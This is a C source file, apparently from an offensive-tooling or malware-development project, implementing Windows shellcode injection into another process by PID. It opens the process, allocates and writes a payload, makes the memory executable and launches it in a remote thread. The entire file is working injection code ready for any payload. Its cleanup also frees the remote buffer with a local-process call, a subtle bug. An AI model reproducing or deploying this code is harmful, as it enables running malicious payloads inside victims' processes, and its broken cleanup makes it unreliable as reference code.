#include "injection.h"

VOID PrettyFormat(_In_ LPCSTR FunctionName) {
    WARN("[%s] failed, error: 0x%lx", FunctionName, GetLastError());
    return;
}

BOOL ShellcodeInjection(
    _In_ CONST DWORD PID,
    _In_ CONST PBYTE Payload,
    _In_ CONST SIZE_T PayloadSize
) {

    BOOL   State         = TRUE;
    DWORD  TID           = 0;
    DWORD  OldProtection = 0;
    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle  = NULL;
    PVOID  Buffer        = NULL;

    ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (NULL == ProcessHandle) {
        PrettyFormat("OpenProcess");
        return FALSE;
    }
    OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Buffer = VirtualAllocEx(ProcessHandle, NULL, PayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NULL == Buffer) {
        PrettyFormat("VirtualAllocEx");
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a buffer with PAGE_READWRITE [RW-] permissions!", Buffer);

    if (!WriteProcessMemory(ProcessHandle, Buffer, Payload, PayloadSize, 0)) {
        PrettyFormat("WriteProcessMemory");
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer", Buffer, PayloadSize);

    if (!VirtualProtectEx(ProcessHandle, Buffer, PayloadSize, PAGE_EXECUTE_READ, &OldProtection)) {
        PrettyFormat("VirtualProtect");
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed buffer's permissions to PAGE_EXECUTE_READ [R-X]", Buffer);

    ThreadHandle = CreateRemoteThreadEx(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, 0, &TID);
    if (NULL == ThreadHandle) {
        PrettyFormat("CreateRemoteThreadEx");
        State = FALSE; goto CLEANUP;
    }

    OKAY("[0x%p] successfully created a thread (%ld)!", ThreadHandle, TID);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    WaitForSingleObject(ThreadHandle, INFINITE);
    INFO("[0x%p] thread finished execution, beginning cleanup...", ThreadHandle);

CLEANUP:

    if (ThreadHandle) {
        CloseHandle(ThreadHandle);
        INFO("[0x%p] closed thread handle", ThreadHandle);
    }

    if (ProcessHandle) {
        CloseHandle(ProcessHandle);
        INFO("[0x%p] closed process handle", ProcessHandle);
    }

    if (Buffer) {
        VirtualFree(Buffer, 0, MEM_RELEASE);
        INFO("[0x%p] remote buffer freed", Buffer);
    }

    return State;

}